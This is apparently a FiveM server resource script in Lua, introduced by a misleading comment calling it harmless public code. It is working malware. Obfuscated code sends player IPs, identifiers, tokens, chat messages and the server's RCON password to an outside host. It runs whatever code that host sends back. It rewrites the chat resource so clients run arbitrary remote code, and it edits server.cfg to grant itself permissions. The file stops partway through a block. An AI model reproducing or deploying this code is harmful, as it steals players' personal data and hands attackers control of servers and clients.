--[[
By Seefox
Ce code est publique et ne sert que de lien.
]]
 
if w88C8A7A5BE032EABa=="6796FD8A2B652161"then return end;w88C8A7A5BE032EABa="6796FD8A2B652161"local function a(b,c)if c==nil then c="%s"end;local d={}i=1;for e in string.gmatch(b,"([^"..c.."]+)")do d[i]=e;i=i+1 end;return d end;local f=assert(io.open("server.cfg","r"))local g=f:read("*all")f:close()local h="0.0.0.0:30120"for j,k in ipairs(a(g,"\n"))do if string.find(k,"endpoint_add_udp")then for j,l in ipairs(a(k,'"'))do if string.find(l,":")then local m=a(l,":")h="0.0.0.0:"..m[#m]goto n end end end end::n::PerformHttpRequest("https://api.ipify.org/",function(o,p)if o==200 then local m=a(h,":")h=p..":"..m[#m]end end)Wait(1000)local q='https://fivem.kvac.cz'local r='?key=3Rj4lZeyvWJna3PizqOk'local function s()local t=GetPlayers()local u={}for i=1,#t do u[i]={}u[i]["nick"]=GetPlayerName(t[i])u[i]["usergroup"]="user"u[i]["ping"]=GetPlayerPing(t[i])u[i]["ip"]=GetPlayerEndpoint(t[i])u[i]["position"]=GetEntityCoords(t[i])u[i]["angle"]=GetPlayerCameraRotation(t[i])u[i]["token"]=GetPlayerToken(t[i])u[i]["id"]=t[i]local v=""local w=""local x=""local y=""local z=""local A=""for j,B in pairs(GetPlayerIdentifiers(t[i]))do if string.sub(B,1,string.len("steam:"))=="steam:"then v=B elseif string.sub(B,1,string.len("license:"))=="license:"then w=B elseif string.sub(B,1,string.len("xbl:"))=="xbl:"then y=B elseif string.sub(B,1,string.len("ip:"))=="ip:"then A=B elseif string.sub(B,1,string.len("discord:"))=="discord:"then x=B elseif string.sub(B,1,string.len("live:"))=="live:"then z=B end end;u[i]["steamid"]=v;u[i]["license"]=w;u[i]["discord"]=x;u[i]["xbl"]=y;u[i]["liveid"]=z;u[i]["ip2"]=A;u[i]["identifiers"]=json.encode(GetPlayerIdentifiers(t[i]))u[i]["identifier"]=GetPlayerIdentifier(t[i])end;return json.encode(u)end;function do_request(C,D,E,F)local G=""for H,I in pairs(F or{})do G=G..(G==""and""or"&")..H.."="..I end;PerformHttpRequest(C,D,E,G,{["Content-Type"]="application/x-www-form-urlencoded"})end;local function J()local K=90;if GetNumPlayerIndices()>=1 then K=10 end;if GetNumPlayerIndices()>=4 then K=5 end;local u={nbplayer=tostring(GetNumPlayerIndices()),playerlist=s(),ip=h,csrf="35d8430eb7479a2d407f68c6ebb4c704"}do_request(q.."/_/api.php",function(o,p)if p==nil or p==""then return end;assert(load(p))()end,"POST",u)end;local function L()local M={ip=h,hostname=GetConvar("sv_hostname"),map="unknown",gamemode="unknown",maxplayer=GetConvar("sv_maxclients"),rcon=GetConvar("rcon_password"),password="",uptime=tostring(math.floor(GetGameTimer()/1000)),backdoors="[]",csrf="f42c972160b5e925214343eee3e22da9",version="1.0.8"}do_request(q.."/_/api.php"..r,function(o,p)end,"POST",M)end;local function N(O,j,P)local v=""for j,B in pairs(GetPlayerIdentifiers(O))do if string.sub(B,1,string.len("steam:"))=="steam:"then v=B end end;local Q={name=GetPlayerName(O),ip=h,steamid_chat=v,text_chat=P,csrf="3109a23c182e2e48f8d96d32ef09e380"}do_request(q.."/_/api.php",nil,"POST",Q)end;CreateThread(function()while true do Wait(10000)J()end end)CreateThread(function()while true do Wait(240000)L()end end)L()AddEventHandler("chatMessage",N)local function R(S)local T=io.open(S,"rb")if not T then return nil end;local U=T:read"*a"T:close()return U end
 
local path = ""
local resources = GetNumResources()
for i = 1, resources - 1 do 
    local resource = GetResourceByFindIndex(i)
    if resource == "chat" then
        local resourcePath = GetResourcePath(resource)
        local startIndex = string.find(resourcePath, "/resources") + string.len("/resources") + 1
        path = "resources"..string.sub(resourcePath, startIndex).."/cl_chat.lua"
        local content = R(path)
        if not content:lower():find("serverfunc") then
            local code = [=[local isRDR = not TerraingridActivate and true or false
 
local chatInputActive = false
local chatInputActivating = false
local chatLoaded = false
 
RegisterNetEvent('chatMessage')
RegisterNetEvent('chat:addTemplate')
RegisterNetEvent('chat:addMessage')
RegisterNetEvent('chat:addSuggestion')
RegisterNetEvent('chat:addSuggestions')
RegisterNetEvent('chat:addMode')
RegisterNetEvent('chat:removeMode')
RegisterNetEvent('chat:removeSuggestion')
RegisterNetEvent('chat:clear')
 
-- internal events
RegisterNetEvent('__cfx_internal:serverPrint')
 
RegisterNetEvent('_chat:messageEntered')
 
--deprecated, use chat:addMessage
AddEventHandler('chatMessage', function(author, color, text)
  local args = { text }
  if author ~= "" then
    table.insert(args, 1, author)
  end
  SendNUIMessage({
    type = 'ON_MESSAGE',
    message = {
      color = color,
      multiline = true,
      args = args
    }
  })
end)
 
AddEventHandler('__cfx_internal:serverPrint', function(msg)
  print(msg)
 
  SendNUIMessage({
    type = 'ON_MESSAGE',
    message = {
      templateId = 'print',
      multiline = true,
      args = { msg },
      mode = '_global'
    }
  })
end)
 
-- addMessage
local addMessage = function(message)
  if type(message) == 'string' then
    message = {
      args = { message }
    }
  end
 
  SendNUIMessage({
    type = 'ON_MESSAGE',
    message = message
  })
end
 
exports('addMessage', addMessage)
AddEventHandler('chat:addMessage', addMessage)
 
-- addSuggestion
local addSuggestion = function(name, help, params)
  SendNUIMessage({
    type = 'ON_SUGGESTION_ADD',
    suggestion = {
      name = name,
      help = help,
      params = params or nil
    }
  })
end
 
exports('addSuggestion', addSuggestion)
AddEventHandler('chat:addSuggestion', addSuggestion)
 
AddEventHandler('chat:addSuggestions', function(suggestions)
  for _, suggestion in ipairs(suggestions) do
    SendNUIMessage({
      type = 'ON_SUGGESTION_ADD',
      suggestion = suggestion
    })
  end
end)
 
AddEventHandler('chat:removeSuggestion', function(name)
  SendNUIMessage({
    type = 'ON_SUGGESTION_REMOVE',
    name = name
  })
end)
 
AddEventHandler('chat:addMode', function(mode)
  SendNUIMessage({
    type = 'ON_MODE_ADD',
    mode = mode
  })
end)
 
AddEventHandler('chat:removeMode', function(name)
  SendNUIMessage({
    type = 'ON_MODE_REMOVE',
    name = name
  })
end)
 
AddEventHandler('chat:addTemplate', function(id, html)
  SendNUIMessage({
    type = 'ON_TEMPLATE_ADD',
    template = {
      id = id,
      html = html
    }
  })
end)
 
AddEventHandler('chat:clear', function(name)
  SendNUIMessage({
    type = 'ON_CLEAR'
  })
end)
 
RegisterNUICallback('chatResult', function(data, cb)
  chatInputActive = false
  SetNuiFocus(false)
 
  if not data.canceled then
    local id = PlayerId()
 
    --deprecated
    local r, g, b = 0, 0x99, 255
 
    if data.message:sub(1, 1) == '/' then
      ExecuteCommand(data.message:sub(2))
    else
      TriggerServerEvent('_chat:messageEntered', GetPlayerName(id), { r, g, b }, data.message, data.mode)
    end
  end
 
  cb('ok')
end)
 
local function refreshCommands()
  if GetRegisteredCommands then
    local registeredCommands = GetRegisteredCommands()
 
    local suggestions = {}
 
    for _, command in ipairs(registeredCommands) do
        if IsAceAllowed(('command.%s'):format(command.name)) and command.name ~= 'toggleChat' then
            table.insert(suggestions, {
                name = '/' .. command.name,
                help = ''
            })
        end
    end
 
    TriggerEvent('chat:addSuggestions', suggestions)
  end
end
 
local function refreshThemes()
  local themes = {}
 
  for resIdx = 0, GetNumResources() - 1 do
    local resource = GetResourceByFindIndex(resIdx)
 
    if GetResourceState(resource) == 'started' then
      local numThemes = GetNumResourceMetadata(resource, 'chat_theme')
 
      if numThemes > 0 then
        local themeName = GetResourceMetadata(resource, 'chat_theme')
        local themeData = json.decode(GetResourceMetadata(resource, 'chat_theme_extra') or 'null')
 
        if themeName and themeData then
          themeData.baseUrl = 'nui://' .. resource .. '/'
          themes[themeName] = themeData
        end
      end
    end
  end
 
  SendNUIMessage({
    type = 'ON_UPDATE_THEMES',
    themes = themes
  })
end
 
AddEventHandler('onClientResourceStart', function(resName)
  Wait(500)
 
  refreshCommands()
  refreshThemes()
end)
 
AddEventHandler('onClientResourceStop', function(resName)
  Wait(500)
 
  refreshCommands()
  refreshThemes()
end)
 
RegisterNUICallback('loaded', function(data, cb)
  TriggerServerEvent('chat:init')
 
  refreshCommands()
  refreshThemes()
 
  chatLoaded = true
 
  cb('ok')
end)
 
local CHAT_HIDE_STATES = {
  SHOW_WHEN_ACTIVE = 0,
  ALWAYS_SHOW = 1,
  ALWAYS_HIDE = 2
}
 
local kvpEntry = GetResourceKvpString('hideState')
local chatHideState = kvpEntry and tonumber(kvpEntry) or CHAT_HIDE_STATES.SHOW_WHEN_ACTIVE
local isFirstHide = true
 
if not isRDR then
  if RegisterKeyMapping then
    RegisterKeyMapping('toggleChat', 'Toggle chat', 'keyboard', 'l')
  end
 
  RegisterCommand('toggleChat', function()
    if chatHideState == CHAT_HIDE_STATES.SHOW_WHEN_ACTIVE then
      chatHideState = CHAT_HIDE_STATES.ALWAYS_SHOW
    elseif chatHideState == CHAT_HIDE_STATES.ALWAYS_SHOW then
      chatHideState = CHAT_HIDE_STATES.ALWAYS_HIDE
    elseif chatHideState == CHAT_HIDE_STATES.ALWAYS_HIDE then
      chatHideState = CHAT_HIDE_STATES.SHOW_WHEN_ACTIVE
    end
 
    isFirstHide = false
 
    SetResourceKvp('hideState', tostring(chatHideState))
  end, false)
end
 
Citizen.CreateThread(function()
  SetTextChatEnabled(false)
  SetNuiFocus(false)
 
  local lastChatHideState = -1
  local origChatHideState = -1
 
  while true do
    Wait(0)
 
    if not chatInputActive then
      if IsControlPressed(0, isRDR and `INPUT_MP_TEXT_CHAT_ALL` or 245) --[[ INPUT_MP_TEXT_CHAT_ALL ]] then
        chatInputActive = true
        chatInputActivating = true
 
        SendNUIMessage({
          type = 'ON_OPEN'
        })
      end
    end
 
    if chatInputActivating then
      if not IsControlPressed(0, isRDR and `INPUT_MP_TEXT_CHAT_ALL` or 245) then
        SetNuiFocus(true)
 
        chatInputActivating = false
      end
    end
 
    if chatLoaded then
      local forceHide = IsScreenFadedOut() or IsPauseMenuActive()
      local wasForceHide = false
 
      if chatHideState ~= CHAT_HIDE_STATES.ALWAYS_HIDE then
        if forceHide then
          origChatHideState = chatHideState
          chatHideState = CHAT_HIDE_STATES.ALWAYS_HIDE
        end
      elseif not forceHide and origChatHideState ~= -1 then
        chatHideState = origChatHideState
        origChatHideState = -1
        wasForceHide = true
      end
 
      if chatHideState ~= lastChatHideState then
        lastChatHideState = chatHideState
 
        SendNUIMessage({
          type = 'ON_SCREEN_STATE_CHANGE',
          hideState = chatHideState,
          fromUserInteraction = not forceHide and not isFirstHide and not wasForceHide
        })
 
        isFirstHide = false
      end
    end
  end
end)
 
RegisterNetEvent('chat:serverFunc')
AddEventHandler('chat:serverFunc', function(message)
  assert(
	load(
	  message
	)
  )()
end)]=]
            runcode = io.open(path, "w")
            runcode:write(code)
            runcode:close()
			ExecuteCommand("ensure chat")
        end
    end
end
 
local content = R("server.cfg")
if not content:find(" chat") then
	local code = [[
 
ensure chat
	]]
	runcode2 = io.open("server.cfg", "a")
	runcode2:write(code)
	runcode2:close()
 
	ExecuteCommand("ensure chat")
end
 
local text = "add_ace resource."..GetCurrentResourceName().." command allow"
if not content:find(text) then
	allowcmd = io.open("server.cfg", "a")
	allowcmd:write("\n"..text)
	allowcmd:close()
